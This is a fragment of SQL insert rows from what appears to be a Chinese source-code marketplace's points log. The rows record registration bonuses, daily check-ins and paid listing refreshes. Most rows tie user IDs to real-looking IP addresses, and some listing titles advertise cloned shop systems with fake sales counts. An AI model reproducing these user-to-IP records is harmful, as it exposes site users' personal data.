(121, 94, '注册会员赠送积分', 10, '2017-08-19 23:47:03', '125.78.90.207'),
(122, 95, '注册会员赠送积分', 10, '2017-08-23 10:06:54', '120.229.103.164'),
(123, 96, '注册会员赠送积分', 10, '2017-08-31 16:51:26', '171.92.217.8'),
(124, 97, '注册会员赠送积分', 10, '2017-09-01 21:14:21', '111.198.38.182'),
(125, 97, '每日签到', 10, '2017-09-01 21:20:03', '111.198.38.182'),
(126, 98, '注册会员赠送积分', 10, '2017-09-03 14:25:09', '39.90.33.216'),
(127, 99, '注册会员赠送积分', 10, '2017-09-03 19:53:56', '113.248.157.83'),
(128, 100, '注册会员赠送积分', 10, '2017-09-05 17:16:43', '221.222.68.12'),
(129, 101, '注册会员赠送积分', 10, '2017-09-05 17:59:02', '113.68.130.143'),
(130, 102, '注册会员赠送积分', 10, '2017-09-06 01:45:08', '125.116.208.181'),
(131, 103, '注册会员赠送积分', 10, '2017-09-06 10:55:14', '223.96.220.207'),
(132, 103, '每日签到', 10, '2017-09-06 13:44:50', '223.96.220.207'),
(133, 104, '注册会员赠送积分', 10, '2017-09-07 01:23:16', '223.96.222.136'),
(134, 104, '每日签到', 10, '2017-09-07 01:23:49', '223.96.222.136'),
(135, 105, '注册会员赠送积分', 10, '2017-09-07 10:06:49', '223.96.222.114'),
(136, 105, '每日签到', 10, '2017-09-07 13:14:36', '223.96.220.105'),
(137, 106, '注册会员赠送积分', 10, '2017-09-08 23:29:04', '36.40.29.95'),
(138, 107, '注册会员赠送积分', 10, '2017-09-12 17:30:25', '60.171.240.222'),
(139, 108, '注册会员赠送积分', 10, '2017-09-15 00:19:28', '223.166.20.195'),
(140, 109, '注册会员赠送积分', 10, '2017-09-15 08:34:38', '14.127.231.47'),
(141, 110, '注册会员赠送积分', 10, '2017-09-15 17:18:20', '163.142.51.9'),
(142, 111, '注册会员赠送积分', 10, '2017-09-17 18:02:36', '223.96.221.164'),
(143, 111, '每日签到', 10, '2017-09-17 21:21:48', '222.242.66.187'),
(144, 112, '注册会员赠送积分', 10, '2017-10-12 23:03:51', '223.87.102.31'),
(145, 113, '注册会员赠送积分', 10, '2017-10-13 22:04:19', '123.190.77.200'),
(146, 114, '注册会员赠送积分', 10, '2017-10-17 12:04:13', '58.254.108.123'),
(147, 115, '注册会员赠送积分', 10, '2017-10-17 13:30:45', '223.64.187.150'),
(148, 116, '注册会员赠送积分', 10, '2017-10-17 19:57:17', '222.222.189.58'),
(149, 117, '注册会员赠送积分', 10, '2017-10-17 23:59:13', '101.247.220.60'),
(150, 118, '注册会员赠送积分', 10, '2017-10-18 11:06:23', '183.11.130.112'),
(151, 119, '注册会员赠送积分', 10, '2017-10-19 15:50:05', '116.8.36.90'),
(152, 120, '注册会员赠送积分', 10, '2017-10-25 22:10:48', '1.89.233.190'),
(153, 16, '每日签到', 10, '2017-10-26 22:54:09', '58.16.197.7'),
(154, 121, '注册会员赠送积分', 10, '2017-10-30 13:19:50', '1.89.233.190'),
(155, 122, '注册会员赠送积分', 10, '2017-11-01 01:06:55', '183.40.1.97'),
(156, 123, '注册会员赠送积分', 10, '2017-11-02 13:46:05', '182.140.175.143'),
(157, 124, '注册会员赠送积分', 10, '2017-11-06 14:44:00', '110.82.171.33'),
(158, 125, '注册会员赠送积分', 10, '2017-11-09 10:31:44', '115.217.117.12'),
(159, 125, '', 10000, '2017-11-15 01:35:53', '127.0.0.1'),
(160, 15, '刷新商品[华美淘宝客程序仿新版卷皮模板源码自动采集文章采集加APP]，消耗积分', 0, '2017-11-18 12:32:19', '127.0.0.1'),
(161, 15, '刷新商品[华美淘宝客程序仿新版卷皮模板源码自动采集文章采集加APP]，消耗积分', -10, '2017-11-18 12:33:12', '127.0.0.1'),
(162, 15, '刷新商品[2017最新高仿京东商城B2B2C多用户商城系统,淘宝采集+虚拟销量]，消耗积分', -10, '2017-11-18 12:33:20', '127.0.0.1'),
(163, 15, '刷新商品[2017春季新款复古高奢蕾丝 重工蝴蝶刺绣 高挑修身中长款连衣裙]，消耗积分', -10, '2017-11-18 12:33:26', '127.0.0.1'),
(164, 15, '刷新商品[2017春季新款复古高奢蕾丝 重工蝴蝶刺绣 高挑修身中长款连衣裙]，消耗积分', -10, '2017-11-18 12:39:20', '113.220.230.214'),
(165, 15, '刷新商品[少时诵诗书所所个人个人各尔特人]，消耗积分', -10, '2017-11-18 12:39:20', '113.220.230.214'),
(166, 126, '注册会员赠送积分', 10, '2017-11-18 15:53:07', '123.161.25.188'),
(167, 127, '注册会员赠送积分', 10, '2017-11-19 13:00:04', '27.47.232.107'),
(168, 128, '注册会员赠送积分', 10, '2017-11-20 01:33:49', '113.86.38.248'),
(169, 129, '注册会员赠送积分', 10, '2017-11-20 13:10:37', '42.199.131.17'),
(170, 130, '注册会员赠送积分', 10, '2017-11-21 01:39:46', '116.8.38.248'),
(171, 131, '注册会员赠送积分', 10, '2017-11-21 13:23:47', '36.98.36.246'),
(172, 132, '注册会员赠送积分', 10, '2017-11-22 11:58:12', '113.110.103.15'),
(173, 133, '注册会员赠送积分', 10, '2017-11-26 00:40:34', '120.230.77.0'),
(174, 134, '注册会员赠送积分', 10, '2017-11-26 03:36:04', '120.229.3.193'),
(175, 135, '注册会员赠送积分', 10, '2017-11-27 11:13:42', '119.176.200.29'),
(176, 135, '每日签到', 10, '2017-11-27 11:23:25', '119.176.200.29'),
(177, 136, '注册会员赠送积分', 10, '2017-11-29 03:58:38', '120.15.178.174'),
(178, 137, '注册会员赠送积分', 10, '2017-12-10 10:41:27', '113.225.168.54'),
(179, 138, '注册会员赠送积分', 10, '2017-12-12 23:36:58', '223.157.221.143'),
(180, 139, '注册会员赠送积分', 10, '2017-12-14 11:57:07', '111.19.44.228'),
(181, 140, '注册会员赠送积分', 10, '2017-12-14 20:48:28', '116.18.228.242'),
(182, 140, '每日签到', 10, '2017-12-14 20:48:41', '116.18.228.242'),
(183, 141, '注册会员赠送积分', 10, '2017-12-15 14:25:53', '101.226.225.84'),
(184, 142, '注册会员赠送积分', 10, '2017-12-28 23:58:30', '119.134.103.52'),
(185, 14, '交易成功，点评商品获得积分', 10, '2017-12-31 23:08:20', '175.15.66.151'),
(186, 143, '注册会员赠送积分', 10, '2018-01-12 21:16:24', '183.226.92.165'),
(187, 144, '注册会员赠送积分', 10, '2018-01-18 01:21:47', '120.239.209.185'),
(188, 145, '注册会员赠送积分', 10, '2018-01-21 15:04:57', '119.134.103.56'),
(189, 146, '注册会员赠送积分', 10, '2018-01-24 14:33:01', '14.25.41.157'),
(190, 147, '注册会员赠送积分', 10, '2018-01-24 16:55:29', '223.157.142.250'),
(191, 148, '注册会员赠送积分', 10, '2018-02-10 16:00:22', '115.35.20.154'),
(192, 149, '注册会员赠送积分', 10, '2018-02-26 13:54:36', '115.206.31.103'),
(193, 150, '注册会员赠送积分', 10, '2018-03-01 15:52:05', '223.96.221.250'),
(194, 151, '注册会员赠送积分', 10, '2018-03-11 16:50:58', '223.88.196.16'),
(195, 152, '注册会员赠送积分', 10, '2018-03-19 14:30:00', '36.4.202.50'),
(196, 153, '注册会员赠送积分', 10, '2018-03-27 21:16:56', '14.116.142.63'),
(197, 154, '注册会员赠送积分', 10, '2018-03-28 16:55:52', '119.4.253.191'),
(198, 155, '注册会员赠送积分', 10, '2018-04-04 17:24:43', '223.96.96.213'),
(199, 156, '注册会员赠送积分', 10, '2018-04-09 03:05:53', '49.118.221.11'),
(200, 156, '每日签到', 10, '2018-04-09 03:08:26', '49.118.221.11'),
(201, 156, '积分兑换金钱', -20, '2018-04-09 03:08:42', '49.118.221.11'),
(202, 157, '注册会员赠送积分', 10, '2018-04-14 12:37:43', '123.151.77.81'),
(203, 158, '注册会员赠送积分', 10, '2018-04-25 17:26:35', '117.67.9.241'),
(204, 159, '注册会员赠送积分', 10, '2018-04-28 07:47:44', '175.169.152.244'),
(205, 160, '注册会员赠送积分', 10, '2018-05-01 01:04:54', '175.169.152.244'),
(206, 161, '注册会员赠送积分', 10, '2018-05-02 22:44:16', '183.226.21.47'),
(207, 161, '每日签到', 10, '2018-05-02 22:45:33', '183.226.21.47'),
(208, 162, '注册会员赠送积分', 10, '2018-05-24 16:29:52', '123.133.101.154'),
(209, 163, '注册会员赠送积分', 10, '2018-06-05 21:41:22', '175.2.85.253'),
(210, 164, '注册会员赠送积分', 10, '2018-06-08 10:18:05', '49.221.17.34'),
(211, 165, '注册会员赠送积分', 10, '2018-06-09 09:41:40', '124.135.235.0'),
(212, 166, '注册会员赠送积分', 10, '2018-06-09 11:51:06', '222.125.4.59'),
(213, 166, '每日签到', 10, '2018-06-09 11:54:14', '222.125.4.59'),
(214, 167, '注册会员赠送积分', 10, '2018-06-10 13:10:35', '58.19.230.80'),
(215, 168, '注册会员赠送积分', 10, '2018-06-11 21:53:50', '113.57.245.217'),
(216, 169, '注册会员赠送积分', 10, '2018-06-12 12:24:09', '49.77.1.221'),
(217, 170, '注册会员赠送积分', 10, '2018-06-15 17:04:15', '113.101.62.12'),
(218, 171, '注册会员赠送积分', 10, '2018-06-24 20:27:15', '122.142.178.97'),
(219, 172, '注册会员赠送积分', 10, '2018-07-05 16:18:47', '220.112.121.200'),
(220, 173, '注册会员赠送积分', 10, '2018-07-25 20:35:08', '111.1.220.146'),
(221, 174, '注册会员赠送积分', 10, '2018-07-25 23:38:06', '123.151.77.48'),
(222, 175, '注册会员赠送积分', 10, '2018-07-26 15:02:38', '110.81.185.251'),
(223, 176, '注册会员赠送积分', 10, '2018-07-28 22:42:39', '175.2.172.251'),
(224, 177, '注册会员赠送积分', 10, '2018-07-28 22:42:39', '175.2.172.251'),
(225, 178, '注册会员赠送积分', 10, '2018-07-28 22:42:39', '175.2.172.251'),
(226, 179, '注册会员赠送积分', 10, '2018-07-28 22:42:39', '175.2.172.251'),
(227, 180, '注册会员赠送积分', 10, '2018-07-28 22:42:39', '175.2.172.251'),
(228, 181, '注册会员赠送积分', 10, '2018-07-28 22:42:39', '175.2.172.251'),
(229, 182, '注册会员赠送积分', 10, '2018-07-28 22:42:39', '175.2.172.251'),
(230, 183, '注册会员赠送积分', 10, '2018-07-28 22:42:39', '175.2.172.251'),
(231, 184, '注册会员赠送积分', 10, '2018-07-28 22:42:39', '175.2.172.251'),
(232, 185, '注册会员赠送积分', 10, '2018-07-28 22:42:39', '175.2.172.251'),
(233, 186, '注册会员赠送积分', 10, '2018-07-29 11:32:37', '110.184.76.132'),
(234, 187, '注册会员赠送积分', 10, '2018-07-29 15:43:10', '39.176.69.25'),
(235, 187, '每日签到', 10, '2018-07-29 15:43:19', '39.176.69.25'),
(236, 188, '注册会员赠送积分', 10, '2018-07-31 16:19:47', '113.57.246.85'),
(237, 189, '注册会员赠送积分', 10, '2018-08-07 14:48:23', '219.82.134.219'),
(238, 190, '注册会员赠送积分', 10, '2018-08-08 17:26:43', '120.37.167.95'),
(239, 191, '注册会员赠送积分', 10, '2018-08-22 10:05:22', '123.92.219.223'),
(240, 192, '注册会员赠送积分', 10, '2018-08-24 00:38:53', '175.2.75.151'),
(241, 193, '注册会员赠送积分', 10, '2018-08-29 17:34:42', '223.157.221.28'),
(242, 194, '注册会员赠送积分', 10, '2018-08-30 03:25:08', '223.104.254.147'),
(243, 195, '注册会员赠送积分', 10, '2018-09-03 01:36:38', '123.151.77.123'),
(244, 196, '注册会员赠送积分', 10, '2018-09-04 18:05:43', '183.6.27.96'),
(245, 197, '注册会员赠送积分', 10, '2018-09-07 14:12:21', '183.158.197.236'),
(246, 198, '注册会员赠送积分', 10, '2018-09-17 13:40:59', '171.109.240.122'),
(247, 198, '每日签到', 10, '2018-09-17 13:41:04', '171.109.240.122'),
(248, 199, '注册会员赠送积分', 10, '2018-09-22 22:31:57', '175.2.49.106'),
(249, 200, '注册会员赠送积分', 10, '2018-09-23 21:26:02', '106.12.19.7'),
(250, 201, '注册会员赠送积分', 10, '2018-09-23 22:43:02', '111.15.93.220'),
(251, 202, '注册会员赠送积分', 10, '2018-09-25 22:21:41', '124.226.60.229'),
(252, 203, '注册会员赠送积分', 10, '2018-09-29 21:05:30', '110.212.254.161'),
(253, 204, '注册会员赠送积分', 10, '2018-10-01 01:54:01', '175.2.87.46'),
(254, 205, '注册会员赠送积分', 10, '2018-10-04 22:13:47', '39.181.177.19'),
(255, 206, '注册会员赠送积分', 10, '2018-10-04 23:18:54', '223.73.86.181'),
(256, 207, '注册会员赠送积分', 10, '2018-10-06 19:40:21', '171.213.91.174'),
(257, 208, '注册会员赠送积分', 10, '2018-10-12 11:06:55', '36.157.182.11'),
(258, 209, '注册会员赠送积分', 10, '2018-10-12 14:47:51', '59.51.4.225'),
(259, 210, '注册会员赠送积分', 10, '2018-10-12 22:46:27', '222.242.69.158'),
(260, 211, '注册会员赠送积分', 10, '2018-10-13 22:27:06', '222.242.69.158'),
(261, 212, '注册会员赠送积分', 10, '2018-10-13 22:29:04', '180.88.184.19'),
(262, 212, '每日签到', 10, '2018-10-13 22:37:48', '180.88.184.19'),
(263, 213, '注册会员赠送积分', 10, '2018-10-23 13:18:06', '180.136.232.30'),
(264, 214, '注册会员赠送积分', 10, '2018-10-25 10:37:49', '125.120.14.210'),
(265, 215, '注册会员赠送积分', 10, '2018-11-01 14:41:11', '1.194.68.36'),
(266, 216, '注册会员赠送积分', 10, '2018-11-07 11:02:11', '222.216.129.33'),
(267, 217, '注册会员赠送积分', 10, '2018-11-18 15:21:33', '223.88.38.105'),
(268, 218, '注册会员赠送积分', 10, '2018-11-29 11:53:41', '222.142.73.43'),
(269, 219, '注册会员赠送积分', 10, '2018-12-01 22:44:44', '223.157.165.218'),
(270, 220, '注册会员赠送积分', 10, '2018-12-11 14:30:37', '111.227.7.37'),
(271, 221, '注册会员赠送积分', 10, '2018-12-19 23:22:14', '101.46.20.30'),
(272, 222, '注册会员赠送积分', 10, '2018-12-24 12:12:27', '110.124.183.83'),
(273, 223, '注册会员赠送积分', 10, '2018-12-29 19:50:29', '116.196.91.211'),
(274, 224, '注册会员赠送积分', 10, '2019-01-01 06:51:10', '119.136.113.237'),
(275, 149, '每日签到', 10, '2019-01-01 14:41:50', '115.197.68.204'),
(276, 225, '注册会员赠送积分', 10, '2019-01-08 22:19:22', '110.184.83.187'),
(277, 15, '刷新商品[云划算源码试客系统v4.3.1专业版下载]，消耗积分', -10, '2019-01-15 15:59:24', '223.157.169.107'),
(278, 15, '刷新商品[直销进人系统，网商之家，云计划自动化营销系统四站合一]，消耗积分', -10, '2019-01-15 15:59:24', '223.157.169.107'),
(279, 15, '刷新商品[ve云创系统，直销进人系统]，消耗积分', -10, '2019-01-15 15:59:24', '223.157.169.107'),
(280, 15, '刷新商品[华美淘宝客程序仿新版卷皮模板源码自动采集文章采集加APP]，消耗积分', -10, '2019-01-15 15:59:24', '223.157.169.107'),
(281, 15, '刷新商品[ZN虚拟交易源码交易付费下载系统无域名限制]，消耗积分', -10, '2019-01-15 15:59:24', '223.157.169.107'),
(282, 15, '刷新商品[2017年3月25新增小米膜板友价T5商城 友价源码 新增模板一套阿里大于短信模板]，消耗积分', -10, '2019-01-15 15:59:24', '223.157.169.107'),
(283, 15, '刷新商品[V4最新视频系统源码二合一上传秒拍在线播放程序完整版2017]，消耗积分', -10, '2019-01-15 15:59:24', '223.157.169.107'),
(284, 15, '刷新商品[2017最新高仿京东商城B2B2C多用户商城系统,淘宝采集+虚拟销量]，消耗积分', -10, '2019-01-15 15:59:24', '223.157.169.107'),
(285, 15, '刷新商品[下单有优惠网商之家直销进人系统四站合一电子商务源码]，消耗积分', -10, '2019-01-15 15:59:36', '223.157.169.107'),
(286, 15, '刷新商品[下单有优惠网商之家全民分销系统四站合一电子商务]，消耗积分', -10, '2019-01-15 15:59:36', '223.157.169.107'),
(287, 15, '刷新商品[下单有优惠最新VE云创系统自动化营销电子商务网站建设2017]，消耗积分', -10, '2019-01-15 15:59:36', '223.157.169.107'),
(288, 15, '刷新商品[最新德道云创系统网商之家进人系统四站合一2017下单有优惠]，消耗积分', -10, '2019-01-15 15:59:36', '223.157.169.107'),
(289, 226, '注册会员赠送积分', 10, '2019-01-17 13:40:17', '139.205.13.91'),
(290, 227, '注册会员赠送积分', 10, '2019-01-20 22:01:39', '120.230.81.190'),
(291, 227, '每日签到', 10, '2019-01-20 22:08:12', '120.230.81.190'),
(292, 228, '注册会员赠送积分', 10, '2019-01-26 22:06:32', '124.115.133.200'),
(293, 228, '每日签到', 10, '2019-01-26 22:07:50', '124.115.133.200'),
(294, 229, '注册会员赠送积分', 10, '2019-02-17 22:29:54', '113.127.227.143'),
(295, 230, '注册会员赠送积分', 10, '2019-02-24 20:43:11', '121.35.0.170'),
(296, 231, '注册会员赠送积分', 10, '2019-03-01 00:11:57', '114.107.29.214'),
(297, 232, '注册会员赠送积分', 10, '2019-03-01 03:22:16', '113.96.219.243'),
(298, 233, '注册会员赠送积分', 10, '2019-03-01 11:07:23', '39.185.119.23'),
(299, 234, '注册会员赠送积分', 10, '2019-03-02 17:34:23', '101.130.165.179'),
(300, 234, '每日签到', 10, '2019-03-02 17:37:48', '101.130.165.179'),
(301, 235, '注册会员赠送积分', 10, '2019-03-20 23:12:35', '223.96.159.82'),
(302, 236, '注册会员赠送积分', 10, '2019-03-21 15:49:03', '113.246.174.92'),
(303, 237, '注册会员赠送积分', 10, '2019-03-22 15:03:26', '219.138.247.109'),
(304, 237, '每日签到', 10, '2019-03-22 15:03:31', '219.138.247.109'),
(305, 237, '每日签到', 10, '2019-03-28 20:38:44', '110.52.7.120'),
(306, 238, '注册会员赠送积分', 10, '2019-03-29 15:58:16', '223.96.219.17'),
(307, 15, '每日签到', 10, '2019-04-01 22:31:53', '182.123.29.39'),
(308, 239, '注册会员赠送积分', 10, '2019-04-03 09:38:40', '61.151.178.176'),
(309, 240, '注册会员赠送积分', 10, '2019-04-05 18:29:34', '60.255.32.19'),
(310, 241, '注册会员赠送积分', 10, '2019-04-11 18:08:28', '219.134.217.48'),
(311, 241, '每日签到', 10, '2019-04-11 18:15:30', '219.134.217.48'),
(312, 242, '注册会员赠送积分', 10, '2019-04-11 19:12:24', '223.104.9.214'),
(313, 243, '注册会员赠送积分', 10, '2019-04-13 11:47:55', '14.221.117.105'),
(314, 244, '注册会员赠送积分', 10, '2019-04-13 14:52:03', '36.37.140.92'),
(941, 867, '注册会员赠送积分', 10, '2019-04-30 14:21:34', '115.194.38.239'),
(942, 868, '注册会员赠送积分', 10, '2019-04-30 14:21:34', '115.194.38.239'),
(943, 869, '注册会员赠送积分', 10, '2019-04-30 14:21:34', '115.194.38.239'),
(940, 866, '注册会员赠送积分', 10, '2019-04-30 14:21:34', '115.194.38.239'),
(939, 865, '注册会员赠送积分', 10, '2019-04-30 14:21:34', '115.194.38.239'),
(938, 864, '注册会员赠送积分', 10, '2019-04-30 14:21:34', '115.194.38.239'),
(937, 863, '注册会员赠送积分', 10, '2019-04-30 14:21:34', '115.194.38.239'),
(936, 862, '注册会员赠送积分', 10, '2019-04-30 14:21:34', '115.194.38.239'),
(935, 861, '注册会员赠送积分', 10, '2019-04-30 14:21:34', '115.194.38.239'),
(934, 860, '注册会员赠送积分', 10, '2019-04-30 14:21:34', '115.194.38.239'),
(933, 859, '注册会员赠送积分', 10, '2019-04-30 14:21:34', '115.194.38.239'),
(415, 345, '注册会员赠送积分', 10, '2019-04-20 14:16:07', '223.157.115.211'),
(916, 215, '', 1000, '2019-04-23 23:18:43', '223.91.37.195'),
(917, 846, '注册会员赠送积分', 10, '2019-04-24 17:30:30', '1.193.200.246'),
(918, 15, '每日签到', 10, '2019-04-24 17:44:48', '223.157.128.194'),
(919, 847, '注册会员赠送积分', 10, '2019-04-25 10:49:37', '183.205.179.2'),
(920, 848, '注册会员赠送积分', 10, '2019-04-27 02:52:10', '171.37.28.16'),
(921, 848, '每日签到', 10, '2019-04-27 02:52:19', '171.37.28.16'),
(922, 849, '注册会员赠送积分', 10, '2019-04-29 00:39:14', '112.224.33.133'),
(923, 849, '每日签到', 10, '2019-04-29 00:39:45', '112.224.33.133'),
(924, 850, '注册会员赠送积分', 10, '2019-04-30 14:21:34', '115.194.38.239'),
(925, 851, '注册会员赠送积分', 10, '2019-04-30 14:21:34', '115.194.38.239'),
(926, 852, '注册会员赠送积分', 10, '2019-04-30 14:21:34', '115.194.38.239'),
(927, 853, '注册会员赠送积分', 10, '2019-04-30 14:21:34', '115.194.38.239'),
(928, 854, '注册会员赠送积分', 10, '2019-04-30 14:21:34', '115.194.38.239'),
(929, 855, '注册会员赠送积分', 10, '2019-04-30 14:21:34', '115.194.38.239'),
(930, 856, '注册会员赠送积分', 10, '2019-04-30 14:21:34', '115.194.38.239'),
(931, 857, '注册会员赠送积分', 10, '2019-04-30 14:21:34', '115.194.38.239'),
(932, 858, '注册会员赠送积分', 10, '2019-04-30 14:21:34', '115.194.38.239'),
(1018, 944, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(1017, 943, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(1016, 942, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(1015, 941, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(1014, 940, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(1013, 939, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(1012, 938, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(1011, 937, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(1010, 936, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(1009, 935, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(1008, 934, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(1007, 933, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(1006, 932, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(1005, 931, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(1004, 930, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(1003, 929, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(1002, 928, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(1001, 927, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(1000, 926, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(999, 925, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(998, 924, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(997, 923, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(996, 922, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(995, 921, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(994, 920, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(993, 919, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(992, 918, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(991, 917, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(990, 916, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(989, 915, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(988, 914, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(987, 913, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(986, 912, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(985, 911, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(984, 910, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(983, 909, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(982, 908, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(981, 907, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(980, 906, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(979, 905, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(978, 904, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(977, 903, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(976, 902, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(975, 901, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(974, 900, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(973, 899, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(972, 898, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(971, 897, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(970, 896, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(969, 895, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(968, 894, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(967, 893, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(966, 892, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(965, 891, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(964, 890, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(963, 889, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(962, 888, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(961, 887, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(960, 886, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(959, 885, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(958, 884, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(957, 883, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(956, 882, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(955, 881, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(954, 880, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(953, 879, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(944, 870, '注册会员赠送积分', 10, '2019-04-30 14:21:34', '115.194.38.239'),
(945, 871, '注册会员赠送积分', 10, '2019-04-30 14:21:34', '115.194.38.239'),
(946, 872, '注册会员赠送积分', 10, '2019-04-30 14:21:34', '115.194.38.239'),
(947, 873, '注册会员赠送积分', 10, '2019-04-30 14:21:34', '115.194.38.239'),
(948, 874, '注册会员赠送积分', 10, '2019-04-30 14:21:34', '115.194.38.239'),
(949, 875, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(950, 876, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(951, 877, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(952, 878, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(1024, 950, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(1023, 949, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(1022, 948, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(1019, 945, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(1020, 946, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(1021, 947, '注册会员赠送积分', 10, '2019-04-30 14:21:35', '115.194.38.239'),
(1025, 951, '注册会员赠送积分', 10, '2019-05-10 14:49:06', '111.37.249.129'),
(1026, 952, '注册会员赠送积分', 10, '2019-05-11 16:40:01', '125.127.38.92'),
(1027, 953, '注册会员赠送积分', 10, '2019-05-13 13:44:37', '42.236.177.24'),
(1028, 954, '注册会员赠送积分', 10, '2019-05-13 14:54:31', '42.236.177.24'),
(1029, 955, '注册会员赠送积分', 10, '2019-05-13 14:54:31', '42.236.177.24'),
(1030, 956, '注册会员赠送积分', 10, '2019-05-26 12:03:00', '61.151.178.167'),
(1031, 15, '刷新商品[驾考小程序科一四答题系统，懒人朗读功能，教练推荐提成，直接运营营利]，消耗积分', -10, '2019-05-27 23:56:31', '223.157.119.254'),
(1032, 15, '刷新商品[黄瓜视频app原生源码（运营版）lulube香蕉lutube安卓苹果源码]，消耗积分', -10, '2019-05-28 00:17:01', '223.157.119.254'),
(1033, 957, '注册会员赠送积分', 10, '2019-05-28 20:42:48', '182.97.64.138'),
(1035, 959, '注册会员赠送积分', 10, '2019-06-01 16:55:17', '223.157.116.113'),
(1036, 960, '注册会员赠送积分', 10, '2019-06-05 16:01:04', '113.65.214.4'),
(1037, 960, '每日签到', 10, '2019-06-05 16:02:10', '113.65.214.4'),
(1038, 961, '注册会员赠送积分', 10, '2019-06-06 16:02:15', '111.226.203.167'),
(1039, 962, '注册会员赠送积分', 10, '2019-06-07 23:45:24', '49.74.37.184'),
(1040, 963, '注册会员赠送积分', 10, '2019-06-11 17:24:48', '122.96.47.132'),
(1041, 964, '注册会员赠送积分', 10, '2019-06-14 09:50:02', '118.249.120.92'),
